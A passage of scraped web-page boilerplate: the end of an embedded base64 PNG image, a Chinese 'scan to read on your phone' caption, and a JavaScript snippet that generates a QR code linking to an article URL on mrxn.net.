niwvtPYPs5JNOpONua05f11npzaj2Orma9nFxgPpw40HPG8QfxB2fes1xqAz1ZV6ifcfYhVj7z4euGrE7pTfo1kNOD//nk8mNvvZqu3Z6xnKvWYc6aZ9gae9WarumdsXXWzFiPbB/jM7Zf9VjfeeapWta15rohOZEPwvZN3an/Dj/zddhPr3HYNyPrQI9sPqzWOXWi51IXdL3G1srxi65ZZ964sjVVc91zPY7vuiE5hQ/CNhCn/gz3/VvT9cQ9ZxxOfobkgppLHFQt62gicYVv4CzfNWNrwrXXs2v7nPnTO9CbtdgGctbgyv3cCRwG4qRm/J1t2Wf2NjzKnT3P2hn3Oj1V71qPZ1498u96PAPr7KMePgxE88XvOYFrIO859+VTXzIQr97yKb8SZ55VTj38q8Xtb671I9yMv/7R92t5+GtO1mBc2dwzbJ1e47CaHC3I1ydeMhAfcPF/P4GXDiTTFk7c2K0ah9U6Jxd0fRb7nMozX7T0FIlnqH1cP6qpfb5TY//wSwdSN3atv3cCh4FkSiusHqHftyO88iYn9Fgvq1e2Rq651bp7jWe86lH1s/2d5WqPrLu37ucwkBRceN8JbAOpU3q0fma7vgX2Mp5x7zer6Z5ZPOsdbeZVSz4wrhw9cD9ytKB6f2dtH2vSS2wDMXnxe0/gGsh7z//w9H8AAAD//4VkzpUAAAAGSURBVAMAkNulmKdaA8EAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-dopagefxszhongx-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 